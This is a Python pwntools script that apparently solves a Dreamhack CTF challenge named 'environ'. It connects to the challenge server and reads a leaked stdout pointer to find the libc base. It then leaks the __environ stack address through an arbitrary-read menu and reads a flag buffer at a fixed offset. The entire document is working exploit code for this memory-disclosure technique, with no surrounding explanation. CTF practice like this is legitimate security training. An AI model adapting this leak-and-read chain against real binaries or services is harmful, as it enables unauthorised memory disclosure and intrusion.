from pwn import *

#p = process('./environ')
p = remote('host3.dreamhack.games',11000)

libc = ELF('libc.so.6')
p.recvuntil(b'stdout: ')
stdout = int(p.recvline().strip(), 16)
print(f"stdout address: {hex(stdout)}")

lb = stdout - libc.symbols['_IO_2_1_stdout_']
environ = lb + libc.symbols['__environ']

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', str(environ).encode())
p_environ = u64(p.recvn(6).ljust(8, b'\x00'))
flag_buf = p_environ - 0x1568

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', str(flag_buf).encode())
flag = p.recvline()

print('flag: ' + str(flag))
p.interactive()
